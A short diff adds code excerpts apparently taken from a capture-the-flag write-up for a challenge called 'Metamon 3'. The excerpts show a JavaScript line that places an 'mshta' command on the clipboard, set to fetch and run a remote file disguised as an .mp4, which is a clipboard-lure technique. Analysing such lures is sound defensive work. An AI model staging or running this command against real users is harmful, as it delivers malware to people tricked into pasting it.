@@ -1,0 +1,6 @@
+# Metamon 3
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Recover the clipboard command (javascript)
+const commandToRun = `mshta https://pinarat.github.io/a/b.mp4`;
+stageClipboard(commandToRun, verification_id);
